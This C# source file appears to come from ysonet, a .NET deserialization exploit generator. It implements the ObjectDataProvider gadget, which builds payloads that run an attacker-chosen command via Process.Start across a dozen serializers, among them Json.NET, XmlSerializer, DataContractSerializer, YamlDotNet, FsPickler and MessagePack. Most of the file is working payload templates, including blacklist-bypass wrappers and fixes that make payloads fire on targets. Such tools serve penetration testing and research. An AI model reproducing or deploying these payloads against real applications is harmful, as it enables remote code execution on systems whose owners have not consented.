using fastJSON;
using NDesk.Options;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Data;
using ysonet.Helpers;

/*
 * NOTEs:
 *  What is Xaml2? 
 *      Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
 *  What is DataContractSerializer2? 
 *      DataContractSerializer2 uses Xaml.Parse rather than using ObjectDataProvider directly (as in DataContractSerializer) which is useful for bypassing blacklists
 * 
 * 
 * */

namespace ysonet.Generators
{
    public class ObjectDataProviderGenerator : GenericGenerator
    {
        // Discovery facets (category search only): every path here runs Process.Start
        // via the WPF ObjectDataProvider (code execution).
        //
        // Two payloads that used to live here left, and both for the same reason: they
        // wore this gadget's name while needing something this gadget does not.
        //   - the "ResourceDictionary Source=URL" payload had a different effect
        //     (network, nested deserialization) and is now the ResourceDictionary
        //     gadget, whose -c is the URI;
        //   - the WorkflowDesigner wrapper needed System.Activities.Presentation, which
        //     these facets do not declare and must not, and existed only when the outer
        //     formatter was already Xaml. It is now the WorkflowDesigner gadget, which
        //     carries the same document to seven more formatters.
        // So this gadget needs no per-variant facet override at all.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.Wpf,
                    GadgetRequirement.NetFramework)
                // PresentationFramework 4.0.0.0 chain; fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        private int variant_number = 1; // Default

        public override List<string> SupportedFormatters()
        {
            // Xaml carries TWO variants: the plain provider and the ResourceDictionary
            // container. The URL payload is the ResourceDictionary gadget now, and the
            // WorkflowDesigner wrapper is the WorkflowDesigner gadget.
            return new List<string> { "Xaml (2)", "Json.NET", "FastJson", "JavaScriptSerializer", "XmlSerializer (2)", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler", "SharpSerializerBinary", "SharpSerializerXml", "MessagePackTypeless", "MessagePackTypelessLz4" };
        }

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2 based on formatter. NOTE: two variants left this gadget. Variant 3 was the ResourceDictionary XAML-url payload and is now the ResourceDictionary gadget, whose -c is the URI. Variant 4 was the WorkflowDesigner wrapper and is now the WorkflowDesigner gadget, which also reaches Json.NET, FastJson, JavaScriptSerializer, both SharpSerializer modes and both MessagePack Typeless flavours.", v => int.TryParse(v, out variant_number) },
            };

            return options;
        }

        public override string Finders()
        {
            return "Oleksandr Mirosh, Alvaro Munoz";
        }

        // Variant meaning depends on the formatter. Three of them branch on the number, and
        // SupportedFormatters() annotates exactly those three: Xaml (the ResourceDictionary
        // container), XmlSerializer (a LosFormatter inner payload) and DataContractSerializer
        // (a different MethodParameters shape). The other nine ignore the number and always
        // build variant 1.
        //
        // TWO VARIANTS RETIRED, and the numbers are NOT reused. Variant 3 was the
        // "ResourceDictionary Source=URL" payload (a different effect: it fetches) and
        // variant 4 was the WorkflowDesigner wrapper (a different requirement:
        // System.Activities.Presentation, and it existed only on the Xaml formatter). Each is
        // its own gadget now, and RefuseRetiredVariant below turns the old number into a
        // message naming the replacement rather than quietly building variant 1. Renumbering
        // the survivors was considered and rejected: 1 and 2 already are 1 and 2, and moving a
        // number that used to mean something else is how a script silently builds the wrong
        // payload. See docs/usage-and-examples.md.
        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "plain ObjectDataProvider (default)"),
                new GadgetVariant(2, "ResourceDictionary wrapper (Xaml) / LosFormatter inner (XmlSerializer)")
            };
        }

        // A variant number that used to build something this gadget no longer has. Refusing by
        // name is the whole point: silently falling through to variant 1 would hand a scripted
        // caller a payload with a completely different effect and no way to notice.
        private void RefuseRetiredVariant()
        {
            if (variant_number == 3)
                throw new Exception("ObjectDataProvider variant 3 (the ResourceDictionary "
                    + "Source=URL payload) is now the ResourceDictionary gadget. Use "
                    + "-g ResourceDictionary with the URI as -c.");
            if (variant_number == 4)
                throw new Exception("ObjectDataProvider variant 4 (the WorkflowDesigner "
                    + "wrapper) is now the WorkflowDesigner gadget. Use -g WorkflowDesigner, "
                    + "which builds the same document and also supports Json.NET, FastJson, "
                    + "JavaScriptSerializer, SharpSerializer and MessagePack Typeless.");
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, Soroush Dalili, Dane Evans";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // We set odp.IsInitialLoadEnabled = false before assigning ObjectInstance so
        // that BUILDING the payload does not invoke the method inside ysonet itself.
        // XamlWriter.Save then writes that property into the payload, where it is
        // actively harmful: it suppresses the initial load, so a target that parses
        // the XAML on a WPF/STA (dispatcher) thread never runs the method. Strip it
        // from what we emit; the live object keeps the flag, so generation stays safe.
        //
        // The --minify path already discarded this attribute, which is why a minified
        // payload fired while the plain one silently did nothing (no exception, no
        // execution). PayloadsFireIntoTestSinks fires Xaml variant 1 in both states.
        private static string DropInitialLoadSuppressor(string xaml)
        {
            if (string.IsNullOrEmpty(xaml))
                return xaml;
            return xaml.Replace(" IsInitialLoadEnabled=\"False\"", "");
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            RefuseRetiredVariant();

            // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
            if (formatter.ToLower().Equals("xaml"))
            {
                ProcessStartInfo psi = new ProcessStartInfo();

                psi.FileName = inputArgs.CmdFileName;
                if (inputArgs.HasArguments)
                {
                    psi.Arguments = inputArgs.CmdArguments;
                }

                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;
                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                string payload = "";

                if (variant_number == 2)
                {
                    // ResourceDictionary is used here as a CONTAINER, not as a sink: the
                    // dictionary simply holds the ObjectDataProvider, and the effect is still
                    // odp -> Process.Start. Nothing sets Source, so nothing is fetched.
                    //
                    // That is why this variant stayed here when the URL payload left. The
                    // ResourceDictionary GADGET is about one member, Source, whose setter
                    // opens a WebRequest; this is a XAML serialization detail of the ODP
                    // graph. Moving it would give that gadget a payload whose real sink is
                    // ObjectDataProvider's. The same reading applies to the inner XAML
                    // documents in the XmlSerializer, DataContractSerializer and FsPickler
                    // branches below, which wrap the provider in a ResourceDictionary element
                    // for exactly the same reason.
                    ResourceDictionary myResourceDictionary = new ResourceDictionary();
                    myResourceDictionary.Add("", odp);
                    // XAML serializer can also be exploited!
                    payload = SerializersHelper.Xaml_serialize(myResourceDictionary);

                }
                else
                {
                    //payload = XamlWriter.Save(odp);
                    payload = SerializersHelper.Xaml_serialize(odp);
                }

                // Never ship the initial-load suppressor (see DropInitialLoadSuppressor).
                payload = DropInitialLoadSuppressor(payload);

                if (inputArgs.Minify)
                {
                    // using discardable regex array to make it shorter!
                    payload = XmlMinifier.Minify(payload, null, new String[] { @"StandardErrorEncoding=.*LoadUserProfile=""False"" ", @"IsInitialLoadEnabled=""False"" " });
                }

                // The STA branch that used to sit here belonged to the WorkflowDesigner
                // wrapper, whose target constructs WPF objects. It left with that payload, and
                // the mechanic is a shared one now (GenericGenerator.SelfTestNeedsStaThread).
                // Variants 1 and 2 build no WPF object themselves, so a plain deserialize is
                // all this path ever needed.
                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.Xaml_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            if (formatter.ToLower().Equals("json.net"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                string cmdPart = "";

                if (inputArgs.HasArguments)
                {
                    cmdPart = "'" + inputArgs.CmdFileName + "', '" + inputArgs.CmdArguments + "'";
                }
                else
                {
                    cmdPart = "'" + inputArgs.CmdFileName + "'";
                }

                String payload = @"{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':[" + cmdPart + @"]
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}";
                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = JsonMinifier.Minify(payload, new String[] { "PresentationFramework", "mscorlib", "System" }, null);
                    }
                    else
                    {
                        payload = JsonMinifier.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JsonNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fastjson"))
            {
                // DOUBLE quoted template, so the command is escaped for a double quoted JSON
                // string. The single quoted escaping used by the Json.NET and
                // JavaScriptSerializer branches below would also write an apostrophe as \',
                // which is not a legal JSON escape, and fastJSON DELETES that character:
                // "C:\John's app\x.exe" would start C:\Johns app\x.exe instead.
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSONDoubleQuoted;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @""",""Arguments"":""" + inputArgs.CmdArguments + @"""";
                }
                else
                {
                    cmdPart = @"""FileName"":""" + inputArgs.CmdFileName + @"""";
                }

                String payload = @"{
    ""$types"":{
        ""System.Windows.Data.ObjectDataProvider, PresentationFramework, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = 31bf3856ad364e35"":""1"",
        ""System.Diagnostics.Process, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""2"",
        ""System.Diagnostics.ProcessStartInfo, System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089"":""3""
    },
    ""$type"":""1"",
    ""ObjectInstance"":{
        ""$type"":""2"",
        ""StartInfo"":{
            ""$type"":""3"",
            " + cmdPart + @"
        }
    },
    ""MethodName"":""Start""
}";

                if (inputArgs.Minify)
                {
                    payload = JsonMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        var instance = JSON.ToObject<Object>(payload);

                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("javascriptserializer"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "', 'Arguments':'" + inputArgs.CmdArguments + "'";
                }
                else
                {
                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "'";
                }

                String payload = @"{
    '__type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35', 
    'MethodName':'Start',
    'ObjectInstance':{
        '__type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        'StartInfo': {
            '__type':'System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
            " + cmdPart + @"
        }
    }
}";

                if (inputArgs.Minify)
                {
                    payload = JsonMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.JavaScriptSerializer_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("xmlserializer"))
            {
                String payload = "";

                if (variant_number == 2)
                {
                    string losFormatterPayload = Encoding.UTF8.GetString(
                        (byte[])new TypeConfuseDelegateGenerator().GenerateInner("LosFormatter", inputArgs));
                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Deserialize</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">" + losFormatterPayload + @"</anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""LosFormatter""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfLosFormatterObjectDataProvider>
</root>
";
                }
                else
                {

                    inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                    String cmdPart;

                    if (inputArgs.HasArguments)
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                    }
                    else
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                    }

                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xsi:type=""xsd:string"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type=""XamlReader""></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>
";
                }


                if (inputArgs.Minify)
                {
                    payload = XmlMinifier.Minify(payload, null, null, FormatterType.XMLSerializer, true);
                }


                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.XmlSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                String cmdPart, payload;

                if (variant_number == 2)
                {
                    if (inputArgs.HasArguments)
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                    }
                    else
                    {
                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                    }

                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
      <ExpandedElement z:Id=""ref1"" >
        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
            <a:MethodName>Parse</a:MethodName>
            <a:MethodParameters>
                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">{cmdPart}</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </a:MethodParameters>
            <a:ObjectInstance z:Ref=""ref1""/>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
</root>
";
                }
                else
                {
                    if (inputArgs.HasArguments)
                    {
                        cmdPart = $@"<b:anyType i:type=""c:string"">" + inputArgs.CmdFileName + @"</b:anyType>
          <b:anyType i:type=""c:string"">" + inputArgs.CmdArguments + "</b:anyType>";
                    }
                    else
                    {
                        cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + inputArgs.CmdFileName + @"</anyType>";
                    }

                    payload = $@"<?xml version=""1.0""?>
<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
    <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
                                                         xmlns:c=""http://www.w3.org/2001/XMLSchema""
                                                         xmlns:i=""http://www.w3.org/2001/XMLSchema-instance""
                                                         xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/""
                                                         >
      <ExpandedElement z:Id=""ref1"" >
        <__identity i:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
      </ExpandedElement>
      <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
        <a:MethodName>Start</a:MethodName>
        <a:MethodParameters xmlns:b=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
          " + cmdPart + @"
        </a:MethodParameters>
        <a:ObjectInstance z:Ref=""ref1""/>
      </ProjectedProperty0>
    </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
</root>
";
                }
                if (inputArgs.Minify)
                {
                    payload = XmlMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("yamldotnet"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.YamlDotNet;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"FileName: " + inputArgs.CmdFileName + @",
					Arguments: " + inputArgs.CmdArguments;
                }
                else
                {
                    cmdPart = $@"FileName: " + inputArgs.CmdFileName;
                }

                String payload = @"
!<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
    MethodName: Start,
	ObjectInstance: 
		!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
			StartInfo:
				!<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
					" + cmdPart + @"

                }
        }
}";

                if (inputArgs.Minify)
                {
                    payload = YamlMinifier.Minify(payload);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.YamlDotNet_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("fspickler"))
            {
                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;

                String cmdPart;

                if (inputArgs.HasArguments)
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
                }
                else
                {
                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
                }

                String internalPayload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{d:Type c:Process}"" MethodName=""Start"">" + cmdPart + @"</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>";

                // The XAML goes into a DOUBLE quoted JSON string below, so only \ and " are
                // escaped. JsonStringEscape would also write \', which no JSON defines.
                internalPayload = CommandArgSplitter.JsonDoubleQuotedStringEscape(internalPayload);

                String payload = @"{
  ""FsPickler"": ""4.0.0"",
  ""type"": ""System.Object"",
  ""value"": {
          ""_flags"": ""subtype"",
          ""subtype"": {
            ""Case"": ""NamedType"",
            ""Name"": ""Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties"",
            ""Assembly"": {
              ""Name"": ""Microsoft.PowerShell.Editor"",
              ""Version"": ""3.0.0.0"",
              ""Culture"": ""neutral"",
              ""PublicKeyToken"": ""31bf3856ad364e35""
            }
          },
          ""instance"": {
            ""serializationEntries"": [
              {
                ""Name"": ""ForegroundBrush"",
                ""Type"": {
                  ""Case"": ""NamedType"",
                  ""Name"": ""System.String"",
                  ""Assembly"": {
                    ""Name"": ""mscorlib"",
                    ""Version"": ""4.0.0.0"",
                    ""Culture"": ""neutral"",
                    ""PublicKeyToken"": ""b77a5c561934e089""
                  }
                },
                ""Value"": """ + internalPayload + @"""
              }
            ]
          }
    }
  }";

                if (inputArgs.Minify)
                {
                    payload = JsonMinifier.Minify(payload, null, null);
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.FsPickler_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLowerInvariant().Equals("sharpserializerbinary") || formatter.ToLowerInvariant().Equals("sharpserializerxml"))
            {
                // Binary Serialization Mode
                ProcessStartInfo psi = new ProcessStartInfo();

                psi.FileName = inputArgs.CmdFileName;
                if (inputArgs.HasArguments)
                {
                    psi.Arguments = inputArgs.CmdArguments;
                }
                StringDictionary dict = new StringDictionary();
                psi.GetType().GetField("environmentVariables", BindingFlags.Instance | BindingFlags.NonPublic).SetValue(psi, dict);
                Process p = new Process();
                p.StartInfo = psi;

                ObjectDataProvider odp = new ObjectDataProvider();
                odp.MethodName = "Start";
                odp.IsInitialLoadEnabled = false;
                odp.ObjectInstance = p;

                // SharpSerializer has bugs and we need to remove unwanted properties from the serializaiton process
                List<KeyValuePair<Type, List<String>>> allExclusions = new List<KeyValuePair<Type, List<string>>>();

                List<String> ourExcludedProperties = p.GetType().GetProperties().Where(x => !x.Name.Equals("StartInfo")).Select(item => item.Name).ToList();
                KeyValuePair<Type, List<String>> exclusionList = new KeyValuePair<Type, List<String>>(p.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                ourExcludedProperties = odp.GetType().GetProperties().Where(x => !x.Name.Equals("MethodName") && !x.Name.Equals("ObjectInstance")).Select(item => item.Name).ToList();
                exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                if (!inputArgs.HasArguments && inputArgs.Minify)
                {
                    ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName")).Select(item => item.Name).ToList();
                }
                else
                {
                    ourExcludedProperties = psi.GetType().GetProperties().Where(x => !x.Name.Equals("FileName") && !x.Name.Equals("Arguments")).Select(item => item.Name).ToList();
                }

                exclusionList = new KeyValuePair<Type, List<String>>(psi.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                // Why? I don't know but it seems to be another bug
                ourExcludedProperties = new List<String> { "Dispatcher" };
                exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
                allExclusions.Add(exclusionList);

                if (formatter.ToLowerInvariant().Equals("sharpserializerxml"))
                {
                    var serializedData = SerializersHelper.SharpSerializer_Xml_serialize_WithExclusion_ToString(odp, allExclusions);

                    if (inputArgs.Minify)
                    {
                        serializedData = XmlMinifier.Minify(serializedData, null, new string[] { @" name=""r""" }, FormatterType.DataContractXML, true);
                    }


                    if (inputArgs.Test)
                    {
                        try
                        {
                            SerializersHelper.SharpSerializer_Xml_deserialize_FromString(serializedData);
                        }
                        catch { }
                    }
                    return serializedData;
                }
                else
                {
                    var serializedData = SerializersHelper.SharpSerializer_Binary_serialize_WithExclusion_ToByteArray(odp, allExclusions);
                    if (inputArgs.Test)
                    {
                        try
                        {
                            SerializersHelper.SharpSerializer_Binary_deserialize_FromByteArray(serializedData);
                        }
                        catch { }
                    }
                    return serializedData;
                }
            }
            else if (IsMessagePackTypeless(formatter))
            {
                byte[] serializedData = BuildMessagePackTypeless(
                    inputArgs.CmdFileName,
                    inputArgs.CmdArguments,
                    IsMessagePackLz4(formatter));

                if (inputArgs.Test)
                {
                    try
                    {
                        MessagePackTypelessTypeSwap.Deserialize(serializedData, IsMessagePackLz4(formatter));
                    }
                    catch { }
                }
                return serializedData;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }

        // The MessagePack Typeless encoding of this chain. Building the real graph would call
        // ObjectDataProvider's method inside ysonet, so serialize the surrogate graph below and
        // have MessagePack write the three framework type names instead of the surrogate ones.
        // MessagePack >= 2.3.75.
        private static byte[] BuildMessagePackTypeless(string cmdFileName, string cmdArguments, bool useLz4)
        {
            var graph = new ObjectDataProviderSurrogate
            {
                MethodName = "Start",
                ObjectInstance = new ProcessSurrogate
                {
                    StartInfo = new ProcessStartInfoSurrogate
                    {
                        FileName = cmdFileName,
                        Arguments = cmdArguments
                    }
                }
            };

            // Only the two members that are DECLARED as object need a name: MessagePack
            // Typeless writes a type name exactly where the static type is object (the root
            // here, and ObjectInstance), and writes a bare map everywhere else. StartInfo is
            // declared as its own concrete type, so no name is written for it and none is
            // needed - the target resolves it from the real Process.StartInfo property type.
            // Locked by MessagePackTypelessCarriesTargetTypeNames.
            var targetTypeNames = new Dictionary<Type, string>
            {
                {
                    typeof(ObjectDataProviderSurrogate),
                    "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
                },
                {
                    typeof(ProcessSurrogate),
                    "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
                }
            };

            return MessagePackTypelessTypeSwap.SerializeAs(graph, targetTypeNames, useLz4);
        }

        // Shape only, never deserialized as itself: MessagePackTypelessTypeSwap rewrites each
        // type name to the framework type in the map above before the payload leaves ysonet.
        internal sealed class ObjectDataProviderSurrogate
        {
            public string MethodName { get; set; }
            public object ObjectInstance { get; set; }
        }

        internal sealed class ProcessSurrogate
        {
            public ProcessStartInfoSurrogate StartInfo { get; set; }
        }

        internal sealed class ProcessStartInfoSurrogate
        {
            public string FileName { get; set; }
            public string Arguments { get; set; }
        }
    }
}
